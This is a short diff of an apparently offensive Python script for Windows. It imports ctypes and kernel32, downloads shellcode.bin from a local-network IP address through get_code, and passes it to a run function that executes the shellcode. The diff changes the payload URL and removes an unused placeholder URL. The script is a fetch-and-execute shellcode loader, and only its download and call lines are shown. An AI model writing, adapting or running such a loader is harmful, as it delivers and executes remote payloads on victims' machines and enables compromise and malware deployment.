@@ -3,7 +3,6 @@ from urllib import request
 import base64
 import ctypes
 
-URL = 'http://192.168.1.xxx:xxxx/shellcode.bin'
 
 kernel32 = ctypes.windll.kernel32
 
@@ -37,6 +36,6 @@ def run(shellcode):
 
 
 if __name__ == '__main__':
-    url = "http://192.168.1.203:8000/my32shellcode.bin"
+    url = 'http://192.168.1.145/shellcode.bin'
     shellcode = get_code(url)
     run(shellcode)
